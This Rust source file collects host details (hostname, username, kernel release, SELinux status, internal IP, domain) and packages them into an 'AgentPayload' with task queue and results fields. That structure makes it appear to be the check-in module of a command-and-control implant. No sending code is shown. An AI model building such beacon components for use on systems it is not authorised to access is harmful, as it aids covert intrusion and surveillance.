use serde::{Serialize};
use ureq::Agent;
use std::ffi::CStr;
//Crate for information gathering functions
pub mod local_ip{
    use std::net::UdpSocket;
    pub fn get()->Option<String>{
        let socket=UdpSocket::bind("0.0.0.0:0").ok()?;
        socket.connect("8.8.8.8:80").ok()?;
        Some(socket.local_addr().ok()?.ip().to_string())
    }
}

#[cfg(target_os="linux")]
pub mod whoami{
    use std::{ffi::CStr, os};
    pub fn platform()->String{
        //initialize zero buffer
        let mut name=std::mem::MaybeUninit::<libc::utsname>::zeroed();

        let kernel="Linux".to_string();
        let selinux=if std::path::Path::new("/sys/fs/selinux").exists(){
            "Security Enhanced"
        }
        else {
            ""
        }.to_string();
        
        if unsafe{libc::uname(name.as_mut_ptr())}==0{
            let name=unsafe{name.assume_init()};
            if let Ok(release)=unsafe{CStr::from_ptr(name.release.as_ptr()).to_str()}{
                if !selinux.is_empty(){
                    return format!("{} {} {}",kernel,release,selinux);
                }
                else{
                    return format!("{} {}",kernel,release);
                }
            }
        }

        if !selinux.is_empty(){
            return format!("{} {}", kernel, selinux);
        }else{
            return kernel;
        }
    }

    pub fn generic_platform()->String{
        "Linux".to_string()
    }

    pub fn username()->Option<String>{
        let passwd:&libc::passwd=unsafe{
            let passwd=libc::getpwuid(libc::getuid());
            if passwd.is_null()||(*passwd).pw_name.is_null(){
                return None
            }
            &*passwd
        };
        let name_str=unsafe{CStr::from_ptr(passwd.pw_name)};
        let u_name=name_str.to_string_lossy().into_owned();
        Some(u_name)
    }

    pub fn hostname()->Option<String>{
        //allocate buffer
        let mut host=[0 as libc::c_char;256];
        let name_ptr=unsafe{
            //call gethostname to fetch hostname into buffer
            let ret=libc::gethostname(host.as_mut_ptr(),255);
            if ret==-1{
                return None;
            }
            CStr::from_ptr(host.as_ptr())
        };
        Some(name_ptr.to_string_lossy().into_owned())
    }
    
    pub fn internal_domain()->Option<String>{
        let mut name=std::mem::MaybeUninit::<libc::utsname>::zeroed();
        
        if unsafe{libc::uname(name.as_mut_ptr())}!=0{
            return None;    
        }
        let name=unsafe{name.assume_init()};
        let domain_ptr=unsafe{CStr::from_ptr(name.domainname.as_ptr() as *const libc::c_char) };
        let domainname=domain_ptr.to_string_lossy();
        if domainname=="(none)"||domainname.is_empty(){
            return None;
        }
        Some(domainname.into_owned())
    }

}
#[derive(Clone,Serialize,Debug)]
pub struct AgentPayload
{
    id: String,
    hostname:String,
    os:String,
    username:String,
    internal_ip:String,
    task_queue:Vec<serde_json::Value>,
    task_results:Vec<serde_json::Value>
}

pub fn get_checkin_info()->String{
    let uid=unsafe{libc::getuid()};
    let payload=AgentPayload{
        id:uid.to_string(),
        hostname:whoami::hostname().unwrap_or_default(),
        os:whoami::platform(),
        username:whoami::username().unwrap_or_default(),
        internal_ip:local_ip::get().unwrap_or_default(),
        task_queue:Vec::new(),
        task_results:Vec::new()
    };
    serde_json::to_string(&payload).unwrap()
}